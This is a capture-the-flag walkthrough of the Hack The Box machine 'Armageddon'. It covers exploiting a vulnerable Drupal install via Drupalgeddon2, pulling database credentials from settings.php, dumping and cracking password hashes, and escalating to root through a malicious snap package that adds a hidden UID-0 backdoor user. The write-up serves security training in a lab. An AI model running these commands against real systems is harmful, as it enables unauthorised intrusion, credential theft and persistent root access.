---
description: https://app.hackthebox.com/machines/323
---

# Armageddon

## Nmap

```
nmap 10.10.10.233 -p- -sS -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```

Port 80 hosts a web server which is visually identifiable as a Drupal instance.

![](<../../../.gitbook/assets/image (341).png>)

Standard enumeration did not show any interest information. From here drupwn was utilized to identify the exact version of Drupal installed.

**Github:** [https://github.com/immunIT/drupwn](https://github.com/immunIT/drupwn)

**Install**

```
git clone https://github.com/immunIT/drupwn.git
cd drupwn
python3 setup.py install
```

**Usage**

```
drupwn --mode enum --target http://10.10.10.233  
```

![](<../../../.gitbook/assets/image (912).png>)

`Searchsploit` \*\*\*\* shows that this version of Drupal is vulnerable to "Drupalgeddon".

```bash
searchsploit -w "drupal 7.56"
```

![](<../../../.gitbook/assets/image (260).png>)

Metasploit has a module for drupalgeddon2. Once the corrects options were set the exploit was executed.

![](<../../../.gitbook/assets/image (356).png>)

Where we receive a meterpreter shell.

![](<../../../.gitbook/assets/image (93).png>)

Now with a shell, we find we are working as the _apache_ user. As Drupal is installed we perform some basic enumeration steps to look for `MySQL` usernames and passwords. The command below can be used to scour the `settings.php` file for this information.

```bash
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```

![](<../../../.gitbook/assets/image (239).png>)

Finding the above credentials we run a single command against `MySQL` to find a hash for a user on the machine.

```bash
mysql -u drupaluser --password='CQHEy@9M*m23gBVj' -e 'use drupal; select * from users'
```

![](<../../../.gitbook/assets/image (222).png>)

This hash is then cracked with `john` to reveal the credentials: `brucetherealadmin:boobo`.

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ~/Desktop/hash.txt   
```

We can now login over `SSH` as the user _brucetherealadmin_.

![](<../../../.gitbook/assets/image (235).png>)

From here linpeas.sh was utilized to help with Privilege Escalation identification.

![](<../../../.gitbook/assets/image (259).png>)

We find the current user can run the `/usr/bin/snap` binary as the `root` user without specifying a password.

**GTFOBins:** [https://gtfobins.github.io/gtfobins/snap/](https://gtfobins.github.io/gtfobins/snap/)

![](<../../../.gitbook/assets/image (236).png>)

From the above GTFOBins link we see that a malicious package can be crafted and used to execute the package in the context of the `root` user.

The blog post linked below shows some ways in which this can be done.

**Blog:** [https://blog.ikuamike.io/posts/2021/package\_managers\_privesc/#exploitation-snap](https://blog.ikuamike.io/posts/2021/package\_managers\_privesc/#exploitation-snap)

We can also use the below Snap\_Generator to help us easily craft the required `snap` packages.

**Github:** [https://github.com/0xAsh/Snap\_Generator](https://github.com/0xAsh/Snap\_Generator)

**Install fpm (Required)**

```
sudo gem install fpm
```

**Download and prepare Snap\_Generator**

```
wget https://raw.githubusercontent.com/0xAsh/Snap_Generator/main/snap_generator.sh && chmod +x snap_generator.sh
```

After running the above command we need to then issue a command to the snap\_generator.sh script to use in our package. In this instance we will add a new `root` user to the target system.

```
/usr/sbin/useradd -p $(openssl passwd -1 Password123) -u 0 -o -s /bin/bash -m owned
```

![](<../../../.gitbook/assets/image (134).png>)

Upload the snap package to the target system.

```
sudo -u root /usr/bin/snap install /home/brucetherealadmin/owned_1.0_all.snap --dangerous --devmode
```

After completion check for existence of the new user.

![](<../../../.gitbook/assets/image (41) (2).png>)

Once confirmed, switch over to the new user.

![](<../../../.gitbook/assets/image (1051).png>)
